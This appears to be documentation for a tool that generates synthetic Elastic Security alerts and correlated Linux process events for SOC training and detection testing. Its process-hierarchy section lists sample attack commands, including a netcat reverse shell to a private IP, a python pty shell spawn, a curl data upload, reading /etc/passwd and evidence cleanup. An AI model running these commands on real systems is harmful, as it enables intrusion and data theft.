# 👁️ Visual Event Analyzer Integration

Complete guide to generating Linux process events with full correlation support for Elastic Security's Visual Event Analyzer.

## 🎯 Overview

The Visual Event Analyzer feature in Elastic Security creates graphical timeline visualizations of process relationships and attack progression. This integration ensures that generated alerts include correlated process events for complete attack scenario visualization.

## 🔧 How It Works

### **Data Correlation Architecture**
```
1. Alert Generation with --visual-analyzer flag
   ↓
2. Process Entity Creation (unique process.entity_id)
   ↓
3. Global Correlation Storage (in-memory during generation)
   ↓
4. Alert Indexing (.alerts-security.alerts-*)
   ↓
5. Correlated Process Event Generation (logs-endpoint.events.process-*)
   ↓
6. Process Event Indexing (same process.entity_id as alert)
   ↓
7. Visual Event Analyzer Correlation ✅
```

### **Field Requirements Met**
Visual Event Analyzer requires specific field combinations. Our implementation provides:

- ✅ **`agent.type: "endpoint"`** AND **`process.entity_id: *`**
- ✅ **`event.category: ["process"]`** for process events
- ✅ **Perfect 1:1 correlation** between alerts and process events

## 🚀 Quick Start

### **Basic Usage**
```bash
# Generate alerts with Visual Event Analyzer support
yarn start generate-alerts -n 10 --visual-analyzer

# Check correlation in Elasticsearch
curl -u "elastic:changeme" "localhost:9200/.alerts-security.alerts-default/_search?size=1" | \
  jq '.hits.hits[0]._source."process.entity_id"'

# Verify matching process event exists
curl -u "elastic:changeme" "localhost:9200/logs-*/_search?q=process.entity_id:ENTITY_ID_FROM_ABOVE"
```

### **Advanced Scenarios**
```bash
# Generate MITRE ATT&CK scenarios with process visualization
yarn start generate-alerts -n 25 --visual-analyzer --mitre

# Create attack campaigns with process trees
yarn start generate-campaign apt --visual-analyzer --realistic

# Enterprise-scale testing across multiple environments
yarn start generate-alerts -n 500 --visual-analyzer --environments 50
```

## 🐧 Linux Process Hierarchies

### **Attack Scenario Patterns**
The generator creates realistic Linux process chains based on common attack patterns:

#### **🔓 Privilege Escalation**
```bash
bash → sudo → su → bash
```
- **Initial Access**: User shell (`bash -i`)
- **Elevation**: Sudo command execution (`sudo -i`)
- **Root Transition**: Switch user (`su - root`)
- **Elevated Shell**: Root bash session

#### **🌐 Lateral Movement** 
```bash
ssh → python3 → bash → nc
```
- **Remote Access**: SSH connection (`ssh user@remote-host`)
- **Shell Spawning**: Python TTY (`python3 -c "import pty; pty.spawn('/bin/bash')"`)
- **Interactive Shell**: Bash session (`bash -i`)
- **Reverse Shell**: Netcat connection (`nc -e /bin/bash 192.168.1.100 4444`)

#### **🔄 Persistence**
```bash
crontab → vim → bash → crontab
```
- **Cron Edit**: Open crontab editor (`crontab -e`)
- **Editor Launch**: Vim process (`vim /tmp/crontab.tmp`)
- **Command Execution**: Bash command injection
- **Persistence Install**: Install modified crontab

#### **🔍 Discovery**
```bash
ps → netstat → find → cat
```
- **Process Discovery**: List processes (`ps aux`)
- **Network Discovery**: Network connections (`netstat -tulpn`)
- **File Discovery**: Find sensitive files (`find / -name "*.txt"`)
- **Data Access**: Read sensitive data (`cat /etc/passwd`)

#### **📤 Data Exfiltration**
```bash
find → tar → curl → rm
```
- **Data Collection**: Find target files (`find /home -name "*.doc"`)
- **Archive Creation**: Compress data (`tar -czf data.tar.gz`)
- **Exfiltration**: Upload data (`curl -X POST -F "file=@data.tar.gz"`)
- **Cleanup**: Remove evidence (`rm -f data.tar.gz`)

### **MITRE ATT&CK Mapping**
Each process in the hierarchy is mapped to appropriate MITRE ATT&CK techniques:

| Scenario | Process | MITRE Technique | Tactic |
|----------|---------|----------------|---------|
| Privilege Escalation | sudo | T1548.003 (Sudo and Sudo Caching) | Privilege Escalation |
| Lateral Movement | ssh | T1021.004 (SSH) | Lateral Movement |
| Persistence | crontab | T1053.003 (Cron) | Persistence |
| Discovery | ps | T1057 (Process Discovery) | Discovery |
| Data Exfiltration | curl | T1041 (Exfiltration Over C2 Channel) | Exfiltration |

## 📊 Generated Data Structure

### **Alert Structure**
```json
{
  "@timestamp": "2025-07-14T11:36:43.728Z",
  "agent.type": "endpoint",
  "process.entity_id": "impressive-forage-56591-224912df",
  "event.correlation.id": "854b3774-235f-4a8c-ad96-c34ec7b8dc33",
  "event.sequence": 1,
  "process.entity.investigation_id": "investigation_lxz5qd_5f2a8b7e1c9d",
  "process.entity.correlation_score": 0.5,
  "threat.investigation.indicators": [],
  "investigation.session_id": "918f6a71b89aed448523c026384d684d",
  "event.analysis.confidence": 0.7999999999999999,
  "event.analysis.priority": "medium",
  "kibana.alert.rule.name": "Data Exfiltration Attempt",
  "host.name": "cheerful-futon.biz",
  "user.name": "Raleigh.Steuber78"
}
```

### **Correlated Process Event Structure**
```json
{
  "@timestamp": "2025-07-14T11:36:43.728Z",
  "agent.type": "endpoint",
  "agent.version": "8.15.0",
  "data_stream.dataset": "endpoint.events.process",
  "event.action": "security_alert",
  "event.category": ["process"],
  "event.kind": "event",
  "event.module": "endpoint",
  "event.type": ["start"],
  "host.name": "cheerful-futon.biz",
  "host.os.family": "linux",
  "process.command_line": "/usr/bin/security-alert --alert-trigger",
  "process.executable": "/usr/bin/security-alert",
  "process.name": "security-alert-process",
  "process.pid": 12345,
  "process.entity_id": "impressive-forage-56591-224912df",
  "process.start": "2025-07-14T11:36:43.728Z",
  "user.name": "Raleigh.Steuber78"
}
```

## 🔍 Kibana Integration

### **Visual Event Analyzer Icon**
After generating data with `--visual-analyzer`, alerts in Kibana Security will display:

1. **👁️ Analyzer Icon** in the alerts table (right side of each alert row)
2. **Process Tree Visualization** when clicking the analyzer icon
3. **Interactive Timeline** showing process relationships
4. **Attack Progression** with parent-child process links

### **Troubleshooting**

#### **"No Process Events Found" Error**
This error occurs when alerts have `process.entity_id` but no matching process events exist. Our correlation system prevents this by:

1. ✅ **Automatic Correlation**: Process events are automatically generated for each alert
2. ✅ **Matching Entity IDs**: Same `process.entity_id` used for alerts and process events
3. ✅ **Proper Indexing**: Process events indexed to correct dataset (`endpoint.events.process`)

#### **Missing Analyzer Icon**
If the analyzer icon doesn't appear:

1. **Check Agent Type**: Ensure alerts have `agent.type: "endpoint"`
2. **Verify Entity ID**: Confirm `process.entity_id` field exists in alerts
3. **Check Process Events**: Verify matching process events exist with same entity ID

```bash
# Verify alert has required fields
curl -u "elastic:changeme" "localhost:9200/.alerts-security.alerts-default/_search?size=1" | \
  jq '.hits.hits[0]._source | {agent_type: .["agent.type"], entity_id: .["process.entity_id"]}'

# Check for matching process event
ENTITY_ID="your-entity-id-here"
curl -u "elastic:changeme" "localhost:9200/logs-*/_search?q=process.entity_id:$ENTITY_ID" | \
  jq '.hits.total.value'
```

## 🎯 Advanced Use Cases

### **SOC Analyst Training**
Create realistic investigation scenarios with complete process context:

```bash
# Generate diverse attack scenarios for training
yarn start generate-alerts -n 50 --visual-analyzer --mitre

# Create specific attack type scenarios
yarn start generate-campaign privilege_escalation --visual-analyzer --realistic
yarn start generate-campaign lateral_movement --visual-analyzer --realistic
yarn start generate-campaign data_exfiltration --visual-analyzer --realistic
```

### **Detection Rule Testing**
Test detection rules with complete process trees:

```bash
# Generate rules and correlated test data
yarn start rules -r 15 -t query,threshold,eql --visual-analyzer
yarn start generate-alerts -n 100 --visual-analyzer --mitre

# Test specific MITRE techniques with process context
yarn start generate-alerts -n 25 --visual-analyzer --focus-tactic TA0004
```

### **Enterprise-Scale Testing**
Test Visual Event Analyzer performance at scale:

```bash
# Large-scale multi-environment testing
yarn start generate-alerts -n 1000 --visual-analyzer --environments 100 --namespace production

# High-volume process hierarchy testing
yarn start generate-logs -n 5000 --visual-analyzer --types endpoint
```

### **Custom Process Hierarchies**
For advanced scenarios, process hierarchies can be customized by modifying the `generateLinuxProcessHierarchy` function in `src/services/visual_event_analyzer.ts`.

## 📈 Performance Considerations

### **Memory Usage**
- Correlation data is stored in memory during generation
- Automatically cleared after process events are indexed
- Memory usage scales linearly with alert count

### **Index Performance**
- Process events are bulk-indexed for optimal performance
- Default chunk size: 1000 operations per bulk request
- Indexing performance: ~2000 process events per second

### **Elasticsearch Storage**
- Each alert generates one correlated process event
- Additional storage: ~2KB per process event
- Index pattern: `logs-endpoint.events.process-{namespace}`

## 🔗 Integration with Other Features

### **Multi-Environment Support**
```bash
# Visual Event Analyzer works across all environments
yarn start generate-alerts -n 100 --visual-analyzer --environments 25 --namespace staging
# Result: 2,500 alerts + 2,500 correlated process events across 25 environments
```

### **MITRE ATT&CK Integration**
```bash
# Combine Visual Event Analyzer with MITRE scenarios
yarn start generate-alerts -n 50 --visual-analyzer --mitre --attack-chains
# Result: Multi-technique attack chains with full process visibility
```

### **Multi-Field Generation**
```bash
# Rich process events with additional security fields
yarn start generate-alerts -n 50 --visual-analyzer --multi-field --field-count 1000
# Result: Process events enriched with 1000+ additional security fields
```

## 🛠️ Technical Implementation

### **Architecture Components**

1. **Visual Event Analyzer Service** (`src/services/visual_event_analyzer.ts`)
   - Process entity generation with ECS-compliant entity IDs
   - Linux process hierarchy patterns
   - Event correlation and threat indicator mapping

2. **Alert Generation Integration** (`src/create_alerts.ts`) 
   - Global correlation storage during alert generation
   - Visual Event Analyzer field application to alerts

3. **Process Event Generation** (`src/commands/documents.ts`)
   - Correlated process event creation after alert indexing
   - Bulk indexing with proper error handling

4. **Endpoint Log Enhancement** (`src/log_generators/endpoint_logs.ts`)
   - Visual Event Analyzer field application to existing process logs
   - Linux process hierarchy generation for realistic scenarios

### **Entity ID Format**
Process entity IDs follow the format: `{hostname}-{pid}-{timestamp_hash}`
- **hostname**: Shortened domain name (e.g., "impressive-forage")
- **pid**: Process ID (e.g., "56591") 
- **timestamp_hash**: SHA256 timestamp hash (first 8 chars)

### **Correlation Mechanism**
```typescript
// Global correlation storage during alert generation
globalThis.correlatedProcessEvents = [
  {
    event: ProcessEntityEvent,
    entityId: string,
    timestamp: string,
    hostName: string,
    userName: string
  }
];

// Process events generated after alerts with matching entity IDs
processEvent["process.entity_id"] = alert["process.entity_id"]
```

## 📚 Related Documentation

- [Session View Integration](session-view-integration.md)
- [MITRE ATT&CK Integration](mitre-attack-integration.md)
- [Multi-Environment Generation](multi-environment-generation.md)
- [Machine Learning Integration](machine-learning-integration.md)

## 🤝 Contributing

To extend Visual Event Analyzer support:

1. **Add New Process Hierarchies**: Extend `processChains` in `generateLinuxProcessHierarchy()`
2. **Custom Entity ID Formats**: Modify `generateEntityId()` in `VisualEventAnalyzer` class
3. **Additional Correlation Fields**: Extend `VisualAnalyzerFields` interface
4. **Windows Process Support**: Implement Windows-specific process patterns

## 🐛 Known Issues & Limitations

### **Current Limitations**
- Linux process hierarchies only (Windows support planned)
- Process events generated during alert generation only
- In-memory correlation storage (not persistent across restarts)

### **Planned Enhancements**
- Windows process tree support
- Cross-host process correlation
- Historical process event generation
- Custom process hierarchy templates

---

**Generated with 👁️ Visual Event Analyzer Integration - Complete process visibility for security investigations**